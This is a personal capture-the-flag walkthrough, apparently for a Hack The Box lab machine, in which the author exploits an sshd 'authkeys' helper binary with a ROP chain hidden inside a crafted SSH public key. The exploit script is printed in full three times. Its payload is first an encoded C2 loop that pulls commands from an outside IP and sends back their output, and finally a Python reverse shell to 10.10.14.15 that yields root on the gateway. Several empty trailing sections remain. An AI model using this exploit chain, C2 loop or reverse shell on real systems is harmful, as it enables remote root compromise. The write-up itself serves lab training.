Starting program: /root/attended/authkeystA0AAAAAAAHADQAAAAAAAcANAAAAAAABtA0AAAAAAAHADQAAAAAAAbQNAAAAAAABwA0AAAAAAAHADQAAAAAAAcANAAAAAAABtA0AAAAAAAHADQAAAAAAAcANAAAAAAAA=
Evaluating key...

..
..
..

gef➤  c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
clear: unknown option -- x
usage: clear [-T term]
[ Legend: Modified register | Code | Heap | Stack | String ]
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
[*] Failed to read /proc/<PID>/maps, using GDB sections info: [Errno 2] No such file or directory: '/proc/12863/maps'
$rax   : 0x3b              
$rbx   : 0xffffffffffffffff
$rcx   : 0xa2              
$rdx   : 0x4141414141414141 ("AAAAAAAA"?)
$rsp   : 0x7f7ffffc2930    
$rbp   : 0x7f7ffffc28d0    
$rsi   : 0x0               
$rdi   : 0x0               
$rip   : 0x7f7ffffc2f10    
$r8    : 0x7f7ffffc2eca    
$r9    : 0x7f7ffffc2928    
$r10   : 0x7f7ffffc25c0    
$r11   : 0xc00d000000000000
$r12   : 0x7f7ffffc2a3e    
$r13   : 0x0               
$r14   : 0x0               
$r15   : 0x0               
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x002b $ss: 0x0023 $ds: 0x0023 $es: 0x0023 $fs: 0x0023 $gs: 0x0023 
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
[!] Unmapped address
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x7f7ffffc2f07                  rex.WRB 
   0x7f7ffffc2f08                  rex.RB cmp eax, 0x6f6f722f
   0x7f7ffffc2f0e                  je     0x7f7ffffc2f10
 → 0x7f7ffffc2f10                  rex.WRXB 
   0x7f7ffffc2f11                  rex.WR 
   0x7f7ffffc2f12                  rex.R  push rax
   0x7f7ffffc2f14                  push   rdi
   0x7f7ffffc2f15                  rex.R  cmp eax, 0x6f6f722f
   0x7f7ffffc2f1b                  je     0x7f7ffffc2f1d
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, stopped 0x7f7ffffc2f10 in ?? (), reason: SIGSEGV
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x7f7ffffc2f10 → rex.WRXB 
[#1] 0x7f7ffffc2f1d → push rbx
[#2] 0x7f7ffffc2f30 → rex.WR 
[#3] 0x7f7ffffc2f41 → rex.XB 
[#4] 0x7f7ffffc2f4d → rex.WRB 
[#5] 0x7f7ffffc2f61 → push rbx
[#6] 0x7f7ffffc2f82 → push rax
[#7] 0x7f7ffffc2fd3 → push rsp
[#8] 0x7f7ffffc2fe7 → push rbx
[#9] 0x7f7ffffc2ff6 → rex.WR 
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
0x00007f7ffffc2f10 in ?? ()

====================================================================================================================================

If we continued the program we would see that RAX would be now the value 0x3b which is 59, which is the syscall value we need.

Next step is setting RDI.

After going through all the steps to getting the rdi rax and rsi pointers we should have the following working code
Commands and Output:
====================================================================================================================================
from base64 import b64encode
from pwn import *
import pyperclip

base_addr = 0x6010c0
# GADGETS
shr_eax = p64(0x400370)
not_al = p64(0x40036d)
pop_rdx = p64(0x40036a)
movss_xmm = p64(0x40037b)
cvtss2si_esi = p64(0x400380)
mov_rdi_rsi_pop_rdx = p64(0x400367)
syscall = p64(0x4003cf)

buf = b''

shell = b'from base64 import b64decode; exec(b64decode("aW1wb3J0IHJlcXVlc3RzCmltcG9ydCBvcwpmcm9tIHRpbWUgaW1wb3J0IHNsZWVwCgp3aGlsZSBUcnVlOgogICAgciA9IHJlcXVlc3RzLmdldCgiaHR0cDovLzEwLjEwLjE0LjE1IikKICAgIG91dHB1dCA9IG9zLnBvcGVuKHIudGV4dCwgJ3InLCAxKQogICAgcGF5bG9hZCA9IHsgJ3EnOiBvdXRwdXQgfQogICAgcmVxdWVzdHMuZ2V0KCJodHRwOi8vMTAuMTAuMTQuMTUvb3V0cHV0IiwgcGFyYW1zPXBheWxvYWQpCiAgICBzbGVlcCguMjUpCgo="))\0'

execve_args = [
        b'/usr/local/bin/python2\0',
        b'-c\0',
        shell 
        ]

# Build ARGV 
addrs_execve_args = []
for arg in execve_args:
    addrs_execve_args += [len(buf) + base_addr]
    buf += arg 

# Write Pointers PTRS
addr_argv = len(buf) + base_addr
for addr in addrs_execve_args:
    buf += p64(addr)
buf += p64(0)

# Get floating point addresses 
rdi_ptr = len(buf) + base_addr 
buf += struct.pack('<f', addrs_execve_args[0])
rsi_ptr = len(buf) + base_addr 
buf += struct.pack('<f', addr_argv)

buf += b'A' * (776 - len(buf))
# Setting RAX
buf += not_al
buf += shr_eax
buf += shr_eax
buf += not_al
buf += shr_eax
buf += not_al
buf += shr_eax
buf += shr_eax
buf += shr_eax
buf += not_al
buf += shr_eax
buf += shr_eax
# Setting RDI 
buf += pop_rdx
buf += p64(rdi_ptr)
buf += movss_xmm
buf += cvtss2si_esi
buf += mov_rdi_rsi_pop_rdx
# Set RSI 
buf += p64(rsi_ptr)
buf += movss_xmm
buf += cvtss2si_esi
# Set RDI 
buf += pop_rdx
buf += p64(0)
# Syscall
buf += syscall


b64str = b64encode(buf).decode()
print(b64str)
pyperclip.copy(b64str)
====================================================================================================================================

The downisde on the atteneded gateway we have no way to execute binaries, if we look at authkeys look at note.txt
Enables authkeys on sshd

Commands and Output:
====================================================================================================================================
attended$ cat note.txt                                                                                                                   
on attended:
[ ] enable authkeys command for sshd
[x] remove source code
[ ] use nobody
on attendedgw:
[x] enable authkeys command for sshd
[x] remove source code
[ ] use nobody
====================================================================================================================================

This is not done on attended but on the gateway, if we look at the sshd_config and look for authkeys
Commands and Output:
====================================================================================================================================
..
..
..
# Example of overriding settings on a per-user basis
#Match User anoncvs
#	X11Forwarding no
#	AllowTcpForwarding no
#	PermitTTY no
#	ForceCommand cvs server
#AuthorizedKeysCommand /usr/local/sbin/authkeys %f %h %t %k
#AuthorizedKeysCommandUser root
====================================================================================================================================

The k is going to be the public key, we have to make the ssh thing into the public key

We have to convert our buf.py into a public key. We will create the public key header.

Good overview of creating headers for ssh-keys:
https://stackoverflow.com/questions/29877303/creating-mpint-value-in-java-the-secure-shell-ssh-protocol-architecture-r
https://datatracker.ietf.org/doc/html/rfc4253

If you ever wonder why all ssh keys start with "AAAB" because those are null bytes.
Commands and Output:
====================================================================================================================================
┌─[user@parrot-virtual]─[~/htb/attended/ssh]
└──╼ $echo -n "AAAAB3NzaC1yc2EAAAADAQABAAABgQDKf3s+onWRk9g0bGjm5Nvv15TCUPNKFDxdGIZBgXRGfnwFcrih43O6W6ViOdVn2f5ujLeehYyTr2HQEIiTTsx/oTRXDWTC7QAC/gsa+xeBY9i5cBEdseO8XDej3/Er7z76tMThgsPy9/5wbDSI7e6St2rvsgQLgTgw/u+4ta67c68S8u2snqXEZ8MrJVeK08U1TE5voxXTGFvfB/I/cDeqhF1d49E2Y+QlPefb8B46W37VXbYp+AsKDirWaWcZYa5cgsJtiYhYMr5vagTwjAFWMiQuQ63NhjUqOrxghAuXSx9AlG8nrw82KWIGsdyvEsXZr6BMNTp96En+Z46IjcmRQRdDd+3vytmH0JVnpe0TdxxYp3esFi2jYoP/MOi4mf41dfDO4LG+JV4erv67EsHzaekmuDbSXTZhd9ypO8XUxLg7T0KxwR07hNOvVU2fnoS/y2FSjCNolLYE/39OKJwUFlcgeolSmWo9S24Ia4qjjqSZF+lD4s3kbGlVMnzqExs=" | base64 -d | xxd | less | head -10
00000000: 0000 0007 7373 682d 7273 6100 0000 0301  ....ssh-rsa.....
00000010: 0001 0000 0181 00ca 7f7b 3ea2 7591 93d8  .........{>.u...
00000020: 346c 68e6 e4db efd7 94c2 50f3 4a14 3c5d  4lh.......P.J.<]
00000030: 1886 4181 7446 7e7c 0572 b8a1 e373 ba5b  ..A.tF~|.r...s.[
00000040: a562 39d5 67d9 fe6e 8cb7 9e85 8c93 af61  .b9.g..n.......a
00000050: d010 8893 4ecc 7fa1 3457 0d64 c2ed 0002  ....N...4W.d....
00000060: fe0b 1afb 1781 63d8 b970 111d b1e3 bc5c  ......c..p.....\
00000070: 37a3 dff1 2bef 3efa b4c4 e182 c3f2 f7fe  7...+.>.........
00000080: 706c 3488 edee 92b7 6aef b204 0b81 3830  pl4.....j.....80
00000090: feef b8b5 aebb 73af 12f2 edac 9ea5 c467  ......s........g
====================================================================================================================================

The "0000 0007" stands for the first 7 bytes which is the string "ssh-rsa"
Here are the formats
Commands and Output:
====================================================================================================================================

   The "ssh-dss" key format has the following specific encoding:

      string    "ssh-dss"
      mpint     p
      mpint     q
      mpint     g
      mpint     y
====================================================================================================================================

A friendlier look to ascertain that the headers look like an rfc compliant ssh public key file.
Commands and Output:
====================================================================================================================================
┌─[user@parrot-virtual]─[~/htb/attended]
└──╼ $python3 buf.py | base64 -d | xxd | less -S
00000000: 0000 0007 7373 682d 7273 6100 0000 0301  ....ssh-rsa.....
00000010: 0001 0000 0500 00b9 2f75 7372 2f6c 6f63  ......../usr/loc
00000020: 616c 2f62 696e 2f70 7974 686f 6e32 002d  al/bin/python2.-
00000030: 6300 6672 6f6d 2062 6173 6536 3420 696d  c.from base64 im
00000040: 706f 7274 2062 3634 6465 636f 6465 3b20  port b64decode; 
00000050: 6578 6563 2862 3634 6465 636f 6465 2822  exec(b64decode("
00000060: 6157 3177 6233 4a30 4948 4a6c 6358 566c  aW1wb3J0IHJlcXVl
00000070: 6333 527a 436d 6c74 6347 3979 6443 4276  c3RzCmltcG9ydCBv
00000080: 6377 706d 636d 3974 4948 5270 6257 5567  cwpmcm9tIHRpbWUg
00000090: 6157 3177 6233 4a30 4948 4e73 5a57 5677  aW1wb3J0IHNsZWVw
000000a0: 4367 7033 6147 6c73 5a53 4255 636e 566c  Cgp3aGlsZSBUcnVl
000000b0: 4f67 6f67 4943 4167 6369 4139 4948 4a6c  OgogICAgciA9IHJl
000000c0: 6358 566c 6333 527a 4c6d 646c 6443 6769  cXVlc3RzLmdldCgi
000000d0: 6148 5230 6344 6f76 4c7a 4577 4c6a 4577  aHR0cDovLzEwLjEw
000000e0: 4c6a 4530 4c6a 4531 4969 6b4b 4943 4167  LjE0LjE1IikKICAg
000000f0: 4947 3931 6448 4231 6443 4139 4947 397a  IG91dHB1dCA9IG9z
00000100: 4c6e 4276 6347 5675 4b48 4975 6447 5634  LnBvcGVuKHIudGV4
00000110: 6443 7767 4a33 496e 4c43 4178 4b51 6f67  dCwgJ3InLCAxKQog
00000120: 4943 4167 6347 4635 6247 3968 5a43 4139  ICAgcGF5bG9hZCA9
00000130: 4948 7367 4a33 456e 4f69 4276 6458 5277  IHsgJ3EnOiBvdXRw
====================================================================================================================================

We are having issues tryin to create the ssh public key so instead we will create a giant ssh key so that we can recreate it.
Commands and Output:
====================================================================================================================================
┌─[user@parrot-virtual]─[~/htb/attended/ssh]
└──╼ $ssh-keygen -f big_key -b 16384
Generating public/private rsa key pair.
====================================================================================================================================

After fixing our code as follows we should be able to generate a key that we can then transfer to the attended box
Commands and Output:
====================================================================================================================================
from base64 import b64encode
from pwn import *
import pyperclip

base_addr = 0x6010c0
# GADGETS
shr_eax = p64(0x400370)
not_al = p64(0x40036d)
pop_rdx = p64(0x40036a)
movss_xmm = p64(0x40037b)
cvtss2si_esi = p64(0x400380)
mov_rdi_rsi_pop_rdx = p64(0x400367)
syscall = p64(0x4003cf)

buf = b''

# Public Key Headers
buf += p32(7, endian='big')
buf += b'ssh-rsa'
buf += p32(3, endian='big')
buf += pack(0x10001, 24, endian='big') # e
#buf += p32(0x500, endian='big') # Length of N
buf += p32(0x801, endian='big') # Length of N
buf += b'\x00\xec'

shell = b'from base64 import b64decode; exec(b64decode("aW1wb3J0IHJlcXVlc3RzCmltcG9ydCBvcwpmcm9tIHRpbWUgaW1wb3J0IHNsZWVwCgp3aGlsZSBUcnVlOgogICAgciA9IHJlcXVlc3RzLmdldCgiaHR0cDovLzEwLjEwLjE0LjE1IikKICAgIG91dHB1dCA9IG9zLnBvcGVuKHIudGV4dCwgJ3InLCAxKQogICAgcGF5bG9hZCA9IHsgJ3EnOiBvdXRwdXQgfQogICAgcmVxdWVzdHMuZ2V0KCJodHRwOi8vMTAuMTAuMTQuMTUvb3V0cHV0IiwgcGFyYW1zPXBheWxvYWQpCiAgICBzbGVlcCguMjUpCgo="))\0'

execve_args = [
        b'/usr/local/bin/python2\0',
        b'-c\0',
        shell 
        ]

# Build ARGV 
addrs_execve_args = []
for arg in execve_args:
    addrs_execve_args += [len(buf) + base_addr]
    buf += arg 

# Write Pointers PTRS
addr_argv = len(buf) + base_addr
for addr in addrs_execve_args:
    buf += p64(addr)
buf += p64(0)

# Get floating point addresses 
rdi_ptr = len(buf) + base_addr 
buf += struct.pack('<f', addrs_execve_args[0])
rsi_ptr = len(buf) + base_addr 
buf += struct.pack('<f', addr_argv)

buf += b'A' * (776 - len(buf))
# Setting RAX
buf += not_al
buf += shr_eax
buf += shr_eax
buf += not_al
buf += shr_eax
buf += not_al
buf += shr_eax
buf += shr_eax
buf += shr_eax
buf += not_al
buf += shr_eax
buf += shr_eax
# Setting RDI 
buf += pop_rdx
buf += p64(rdi_ptr)
buf += movss_xmm
buf += cvtss2si_esi
buf += mov_rdi_rsi_pop_rdx
# Set RSI 
buf += p64(rsi_ptr)
buf += movss_xmm
buf += cvtss2si_esi
# Set RDI 
buf += pop_rdx
buf += p64(0)
# Syscall
buf += syscall

buf = buf.ljust(0x817, b'\0')
b64str = b64encode(buf).decode()
print(b64str)
#print(len(buf))
pyperclip.copy(b64str)
====================================================================================================================================

we login to attended and create an exploit.pub with output generated from the python exploit.
Commands and Output:
====================================================================================================================================
attended$ cat exploit.pub                                                                                                                
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAIAQDsL3Vzci9sb2NhbC9iaW4vcHl0aG9uMgAtYwBmcm9tIGJhc2U2NCBpbXBvcnQgYjY0ZGVjb2RlOyBleGVjKGI2NGRlY29kZSgiYVcxd2IzSjBJSEpsY1hWbGMzUnpDbWx0Y0c5eWRDQnZjd3BtY205dElIUnBiV1VnYVcxd2IzSjBJSE5zWldWd0NncDNhR2xzWlNCVWNuVmxPZ29nSUNBZ2NpQTlJSEpsY1hWbGMzUnpMbWRsZENnaWFIUjBjRG92THpFd0xqRXdMakUwTGpFMUlpa0tJQ0FnSUc5MWRIQjFkQ0E5SUc5ekxuQnZjR1Z1S0hJdWRHVjRkQ3dnSjNJbkxDQXhLUW9nSUNBZ2NHRjViRzloWkNBOUlIc2dKM0VuT2lCdmRYUndkWFFnZlFvZ0lDQWdjbVZ4ZFdWemRITXVaMlYwS0NKb2RIUndPaTh2TVRBdU1UQXVNVFF1TVRVdmIzVjBjSFYwSWl3Z2NHRnlZVzF6UFhCaGVXeHZZV1FwQ2lBZ0lDQnpiR1ZsY0NndU1qVXBDZ289IikpANgQYAAAAAAA7xBgAAAAAADyEGAAAAAAAAAAAAAAAAAAsCHASugkwEpBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFtA0AAAAAAAHADQAAAAAAAcANAAAAAAABtA0AAAAAAAHADQAAAAAAAbQNAAAAAAABwA0AAAAAAAHADQAAAAAAAcANAAAAAAABtA0AAAAAAAHADQAAAAAAAcANAAAAAAABqA0AAAAAAAJQSYAAAAAAAewNAAAAAAACAA0AAAAAAAGcDQAAAAAAAmBJgAAAAAAB7A0AAAAAAAIADQAAAAAAAaguser@parrot
====================================================================================================================================

Once inside the machine we come to find there are 2 machines with different ips with attended one is the gatewa which we find if we
look at hosts file and also we find an openssh port on the machine itself
Commands and Output:
====================================================================================================================================
attended$ cat /etc/hosts
127.0.0.1	localhost
::1		localhost
192.168.23.2	attended.attended.htb attended
192.168.23.1	attendedgw.attended.htb attendedgw
====================================================================================================================================

Commands and Output:
====================================================================================================================================
attended$ nc -v -n -w 0 192.168.23.1 1-10000 2>&1 | grep succeeded        
Connection to 192.168.23.1 25 port [tcp/*] succeeded!
Connection to 192.168.23.1 53 port [tcp/*] succeeded!
Connection to 192.168.23.1 80 port [tcp/*] succeeded!
Connection to 192.168.23.1 2222 port [tcp/*] succeeded!
Connection to 192.168.23.1 8080 port [tcp/*] succeeded!
====================================================================================================================================

We run the exploit and wait for a connection back from our main.py but it does not work.
Commands and Output:
====================================================================================================================================
attended$ ssh -i exploit.pub -p 2222 root@attendedgw 
root@attendedgw's password: 
..
..
..
┌─[✗]─[user@parrot-virtual]─[~/htb/attended/c2]
└──╼ $sudo python main.py 
[sudo] password for user: 
$ > Starting webserver

$ > ls
$ > whoami

====================================================================================================================================

Instead we will try to simplify the exploit since the webserver is not handling it correctly we instead use a simple reverse shell
that will listen on port 80 on our local box. First the final poc code for the exploit.
Commands and Output:
====================================================================================================================================
from base64 import b64encode
from pwn import *
import pyperclip

base_addr = 0x6010c0
# GADGETS
shr_eax = p64(0x400370)
not_al = p64(0x40036d)
pop_rdx = p64(0x40036a)
movss_xmm = p64(0x40037b)
cvtss2si_esi = p64(0x400380)
mov_rdi_rsi_pop_rdx = p64(0x400367)
syscall = p64(0x4003cf)

buf = b''

# Public Key Headers
buf += p32(7, endian='big')
buf += b'ssh-rsa'
buf += p32(3, endian='big')
buf += pack(0x10001, 24, endian='big') # e
#buf += p32(0x500, endian='big') # Length of N
buf += p32(0x801, endian='big') # Length of N
buf += b'\x00\xec'

#shell = b'from base64 import b64decode; exec(b64decode("aW1wb3J0IHJlcXVlc3RzCmltcG9ydCBvcwpmcm9tIHRpbWUgaW1wb3J0IHNsZWVwCgp3aGlsZSBUcnVlOgogICAgciA9IHJlcXVlc3RzLmdldCgiaHR0cDovLzEwLjEwLjE0LjE1IikKICAgIG91dHB1dCA9IG9zLnBvcGVuKHIudGV4dCwgJ3InLCAxKQogICAgcGF5bG9hZCA9IHsgJ3EnOiBvdXRwdXQgfQogICAgcmVxdWVzdHMuZ2V0KCJodHRwOi8vMTAuMTAuMTQuMTUvb3V0cHV0IiwgcGFyYW1zPXBheWxvYWQpCiAgICBzbGVlcCguMjUpCgo="))\0'
shell = b'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.15",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\0'

execve_args = [
        b'/usr/local/bin/python2\0',
        b'-c\0',
        shell 
        ]

# Build ARGV 
addrs_execve_args = []
for arg in execve_args:
    addrs_execve_args += [len(buf) + base_addr]
    buf += arg 

# Write Pointers PTRS
addr_argv = len(buf) + base_addr
for addr in addrs_execve_args:
    buf += p64(addr)
buf += p64(0)

# Get floating point addresses 
rdi_ptr = len(buf) + base_addr 
buf += struct.pack('<f', addrs_execve_args[0])
rsi_ptr = len(buf) + base_addr 
buf += struct.pack('<f', addr_argv)

buf += b'A' * (776 - len(buf))
# Setting RAX
buf += not_al
buf += shr_eax
buf += shr_eax
buf += not_al
buf += shr_eax
buf += not_al
buf += shr_eax
buf += shr_eax
buf += shr_eax
buf += not_al
buf += shr_eax
buf += shr_eax
# Setting RDI 
buf += pop_rdx
buf += p64(rdi_ptr)
buf += movss_xmm
buf += cvtss2si_esi
buf += mov_rdi_rsi_pop_rdx
# Set RSI 
buf += p64(rsi_ptr)
buf += movss_xmm
buf += cvtss2si_esi
# Set RDI 
buf += pop_rdx
buf += p64(0)
# Syscall
buf += syscall

buf = buf.ljust(0x817, b'\0')
b64str = b64encode(buf).decode()
print(b64str)
#print(len(buf))
pyperclip.copy(b64str)
====================================================================================================================================

We the copy the output to the exploit.pub file on teh original attended machine and try the ssh command using that public key to
authenticate and set up our listening port
Commands and Output:
====================================================================================================================================
AAAAB3NzaC1yc2EAAAADAQABAAAIAQDsL3Vzci9sb2NhbC9iaW4vcHl0aG9uMgAtYwBpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiMTAuMTAuMTQuMTUiLDgwKSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7IG9zLmR1cDIocy5maWxlbm8oKSwyKTtwPXN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCItaSJdKTsA2BBgAAAAAADvEGAAAAAAAPIQYAAAAAAAAAAAAAAAAACwIcBKkCPASktA0AAAAAAAHADQAAAAAAAcANAAAAAAABtA0AAAAAAAHADQAAAAAAAbQNAAAAAAABwA0AAAAAAAHADQAAAAAAAcANAAAAAAABtA0AAAAAAAHADQAAAAAAAcANAAAAAAABqA0AAAAAAAOgRYAAAAAAAewNAAAAAAACAA0AAAAAAAGcDQAAAAAAA7BFgAAAAAAB7A0AAAAAAAIADQAAAAAAAagNAAAAAAAAAAAAAAAAAAM8DQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==
====================================================================================================================================

Commands and Output:
====================================================================================================================================
attended$ ssh -i exploit.pub -p 2222 root@attendedgw 
Connection closed by 192.168.23.1 port 2222

..
..
..

┌─[✗]─[user@parrot-virtual]─[~/htb/attended/ssh/authkeys]
└──╼ $sudo !!
sudo nc -lnvp 80
[sudo] password for user: 
listening on [any] 80 ...
connect to [10.10.14.15] from (UNKNOWN) [10.10.10.221] 17039
/bin/sh: No controlling tty (open /dev/tty: Device not configured)
/bin/sh: Can't find tty file descriptor
/bin/sh: warning: won't have full job control
attendedgw# whoami
root
====================================================================================================================================

AND we become root. How the exploit.pub file shoudl look like.
Commands and Output:
====================================================================================================================================
attended$ cat exploit.pub                                                                                                                
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAIAQDsL3Vzci9sb2NhbC9iaW4vcHl0aG9uMgAtYwBpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiMTAuMTAuMTQuMTUiLDgwKSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7IG9zLmR1cDIocy5maWxlbm8oKSwyKTtwPXN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCItaSJdKTsA2BBgAAAAAADvEGAAAAAAAPIQYAAAAAAAAAAAAAAAAACwIcBKkCPASktA0AAAAAAAHADQAAAAAAAcANAAAAAAABtA0AAAAAAAHADQAAAAAAAbQNAAAAAAABwA0AAAAAAAHADQAAAAAAAcANAAAAAAABtA0AAAAAAAHADQAAAAAAAcANAAAAAAABqA0AAAAAAAOgRYAAAAAAAewNAAAAAAACAA0AAAAAAAGcDQAAAAAAA7BFgAAAAAAB7A0AAAAAAAIADQAAAAAAAaguser@parrot
====================================================================================================================================

Commands and Output:
====================================================================================================================================
====================================================================================================================================

Commands and Output:
====================================================================================================================================
====================================================================================================================================

Commands and Output:
====================================================================================================================================
====================================================================================================================================

Commands and Output:
====================================================================================================================================
====================================================================================================================================

Commands and Output:
====================================================================================================================================
====================================================================================================================================

Commands and Output:
====================================================================================================================================
====================================================================================================================================

Commands and Output:
====================================================================================================================================
====================================================================================================================================

Commands and Output:
====================================================================================================================================
====================================================================================================================================

Commands and Output:
====================================================================================================================================
====================================================================================================================================
